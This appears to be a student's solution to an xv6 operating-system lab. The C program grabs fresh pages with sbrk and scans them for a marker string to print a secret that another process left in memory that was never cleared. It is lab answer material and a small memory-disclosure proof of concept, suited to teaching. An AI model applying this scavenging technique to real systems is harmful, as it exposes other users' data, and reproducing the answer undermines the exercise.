#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

#define PGSIZE 4096
int
main(int argc, char *argv[])
{
  // Your code here.
  int npages = 64;
  char *mem = sbrk(npages * PGSIZE);
  if (mem == (char *)-1) {
    printf("attack: sbrk failed\n");
    exit(1);
  }

  char *pattern = "help.";
  int pat_len = strlen(pattern);
  int total_len = npages * PGSIZE;

  for (int i = 0; i < total_len - 32; i++) {
    if (memcmp(mem + i, pattern, pat_len) == 0) {
      char *secret = mem + i + 7;
      printf("%s\n", secret);
      exit(0);
    }
  }
  exit(1);
}
